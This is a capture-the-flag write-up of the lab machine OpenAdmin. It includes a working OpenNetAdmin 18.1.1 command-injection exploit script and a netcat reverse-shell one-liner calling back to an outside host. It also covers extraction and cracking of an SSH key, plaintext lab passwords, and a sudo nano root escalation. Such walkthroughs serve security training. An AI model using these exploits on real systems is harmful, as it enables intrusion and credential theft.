![Pasted_image_20210801191010.png](Pasted_image_20210801191010.png)

As always we start with nmap:
```
% sudo nmap -p- --min-rate 1000 -v -sV -oA logs/tcp-extended $IP  -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 15:06 AEST
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 15:06
Completed Parallel DNS resolution of 1 host. at 15:06, 0.00s elapsed
Initiating SYN Stealth Scan at 15:06
Scanning 10.10.10.171 [65535 ports]
Discovered open port 22/tcp on 10.10.10.171
Discovered open port 80/tcp on 10.10.10.171
Completed SYN Stealth Scan at 15:06, 17.09s elapsed (65535 total ports)
Initiating Service scan at 15:06
Scanning 2 services on 10.10.10.171
Completed Service scan at 15:06, 6.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.171.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 15:06
Completed NSE at 15:06, 0.10s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 15:06
Completed NSE at 15:06, 0.08s elapsed
Nmap scan report for 10.10.10.171
Host is up, received user-set (0.038s latency).
Scanned at 2021-08-01 15:06:24 AEST for 23s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.14 seconds
           Raw packets sent: 65708 (2.891MB) | Rcvd: 65554 (2.624MB)
```

Port 80 has a default apache webpage:
![Pasted_image_20210801150933.png](Pasted_image_20210801150933.png)

We run ffuf and identify 3 paths:
```
% ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u "http://$IP/FUZZ" -t 300                                                                                                            ~/oscp/notes/htb/openadmin

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.171/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.                       [Status: 200, Size: 10918, Words: 3499, Lines: 376]
music                   [Status: 301, Size: 312, Words: 20, Lines: 10]
artwork                 [Status: 301, Size: 314, Words: 20, Lines: 10]
sierra                  [Status: 301, Size: 313, Words: 20, Lines: 10]
[...]
```

Each path is a different website:

_music_
![Pasted_image_20210801151031.png](Pasted_image_20210801151031.png)

_artwork_
![Pasted_image_20210801151047.png](Pasted_image_20210801151047.png)

_sierra_
![Pasted_image_20210801151104.png](Pasted_image_20210801151104.png)

Had a look at the websites and didnt find anything of interest. Doesnt seem to be a Wordpress wesbite. No forms, nothing of interest.

However, after looking through burp logs, I found that the login button on the music website links to http://10.10.10.171/ona :
![Pasted_image_20210801185318.png](Pasted_image_20210801185318.png)

Which is **OpenNetAdmin v18.1.1**:

![Pasted_image_20210801185123.png](Pasted_image_20210801185123.png)

And that exact version has an RCE avaiable:
```
% searchsploit OpenNetAdmin
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                  | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)   | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                    | php/webapps/47691.sh
--------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Downloaded the shell exploit and had to modify it slightly so I could see the responses:
```
% cat 47691.sh
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo\"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}"
#| sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

We can get a reverse shell easily by running the following command using the exploit:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 80 >/tmp/f
```

And we get a reverse shell as www-data on our listener:
```
www-data@openadmin:/var/www/ona$ whoami
whoami
www-data
```

Looking around the ona folder we find some config files including one for a database which contains a password:
```
ww-data@openadmin:/var/www/ona/local/config$ cat database_settings.inc.php
cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

We can also retrieve a list of users on the host:
```
www-data@openadmin:/var/www/ona$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

And we try the credentials on all user and see that it works for the jimmy user, however we still don't have user.txt:
```
% ssh jimmy@$IP  ~/oscp/notes/htb/openadmin/exploits
Last login: Sun Aug  1 08:13:38 2021 from 10.10.14.23
jimmy@openadmin:~$ whoami
jimmy
jimmy@openadmin:~$ ls
jimmy@openadmin:~$ ls -al
total 40
drwxr-x--- 5 jimmy jimmy 4096 Aug  1 09:01 .
drwxr-xr-x 4 root  root  4096 Nov 22  2019 ..
lrwxrwxrwx 1 jimmy jimmy    9 Nov 21  2019 .bash_history -> /dev/null
-rw-r--r-- 1 jimmy jimmy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jimmy jimmy 3771 Apr  4  2018 .bashrc
drwx------ 2 jimmy jimmy 4096 Nov 21  2019 .cache
drwx------ 3 jimmy jimmy 4096 Nov 21  2019 .gnupg
drwxrwxr-x 3 jimmy jimmy 4096 Nov 22  2019 .local
-rw-r--r-- 1 jimmy jimmy  807 Apr  4  2018 .profile
-rw------- 1 jimmy jimmy 3526 Aug  1 08:47 .viminfo
-rw------- 1 jimmy jimmy  165 Aug  1 09:01 .Xauthority
jimmy@openadmin:~$ sudo -l
[sudo] password for jimmy:
Sorry, user jimmy may not run sudo on openadmin.
```

We run linpeas from here and see that apache2 has multiples sites enabled:
```
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 32 Nov 22  2019 /etc/apache2/sites-enabled/internal.conf -> ../sites-available/internal.conf
    ServerName internal.openadmin.htb
lrwxrwxrwx 1 root root 33 Nov 22  2019 /etc/apache2/sites-enabled/openadmin.conf -> ../sites-available/openadmin.conf
        # The ServerName directive sets the request scheme, hostname and port that
        # redirection URLs. In the context of virtual hosts, the ServerName
        ServerName openadmin.htb
```

We natigate to the sites-enabled directory and check the contents of the internal site config:
```
www-data@openadmin:/tmp/enum$ cd /etc/apache2/sites-enabled
cd /etc/apache2/sites-enabled
www-data@openadmin:/etc/apache2/sites-enabled$ ls
ls
internal.conf
openadmin.conf
www-data@openadmin:/etc/apache2/sites-enabled$ cat internal.conf
cat internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

The site is exposed on 127.0.0.1:52846 and process requests as the joanna user due to the mpm_itk_module:
> The `mod_mpm_itk` Apache module causes the Apache process to switch to the domain owner’s user identifier (UID) and group identifier (GID) before it responds to the request. This allows each user to isolate their files from others with the standard file permission settings.

[Reference](https://docs.cpanel.net/ea4/apache/apache-module-mpm-itk/)

The document root is on /var/www/internal so we navigate to it. We find 3 php files and we can see that we own the php files and have read/write permissions on those files and that folder:
```
jimmy@openadmin:/var/www/internal$ ls -al
total 20
drwxrwx--- 2 jimmy internal 4096 Aug  1 08:47 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  351 Aug  1 08:47 main.php
```

The main.php appears to have a php type juggling vulnerability due to the hash starting as '00e'. However it requires a magic hash for sha512 and none are currently know. You can find know magic hashes online (eg. https://github.com/spaze/hashes):
```

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
```

The main.php file appears to cat joanna's id_rsa files. Since we have write permissions we can modify it to remove the authenticated check at the top of the file and simply get it to cat the file:
```
jimmy@openadmin:/var/www/internal$ cat main.php
<!-- php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; -->
# Open Admin Trusted
# OpenAdmin
<?php
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

We curl the main.php page on the internal server and get the ssh key back:
```
jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:52846/main.php
<!-- php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; -->
# Open Admin Trusted
# OpenAdmin
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

We convert the key to a crackable hash using `ssh2john.py`:
```
% /usr/share/john/ssh2john.py asdf_rsa
asdf_rsa:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d
```

Cracking the hash with john and finding that the password is `bloodninjas`:
```
% john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                         ~/oscp/notes/htb/openadmin
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (asdf_rsa)
1g 0:00:00:03 DONE (2021-08-01 18:44) 0.2525g/s 3621Kp/s 3621Kc/s 3621KC/s     1990..*7¡Vamos!
Session completed
```

We can use the ssh key and login to as **joanna**:
```
% ssh joanna@$IP -i asdf_rsa
Enter passphrase for key 'asdf_rsa':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug  1 08:45:16 UTC 2021

  System load:  0.0               Processes:             137
  Usage of /:   61.1% of 7.81GB   Users logged in:       1
  Memory usage: 44%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Aug  1 08:37:42 2021 from 10.10.14.23
joanna@openadmin:~$ whoami && cat user.txt
joanna
c9b2cf07d40807e62af62660f0c81b5f
```

We check what we can run with sudo and find that `nano` can be ran as sudo without a password:
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv

```

gtfobins has a command to exploit `nano`:
![Pasted_image_20210801183858.png](Pasted_image_20210801183858.png)

And we can get root using it:
```
Command to execute: reset; sh 1>&0 2>&0# ls
user.txtelp                                               ^X Read File
# cd /root                                                M-F New Buffer
# ls
root.txt
# cat root.txt
2f907ed450b361b2c2bf4e8795d5b561
```